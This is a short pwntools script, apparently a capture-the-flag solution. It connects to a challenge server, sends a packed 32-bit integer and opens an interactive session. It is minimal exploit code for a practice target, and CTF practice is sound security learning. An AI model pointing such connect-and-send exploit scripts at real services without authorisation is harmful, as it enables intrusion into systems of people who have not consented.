#!/usr/bin/env python2
from pwn import *


#host , port = '172.16.115.109' , 10100
#host , port = '192.168.78.252' , 4000
host , port = 'ctf.yuawn.idv.tw' , 10107
y = remote( host , port )


y.send( p32( 878787 ) )


y.interactive()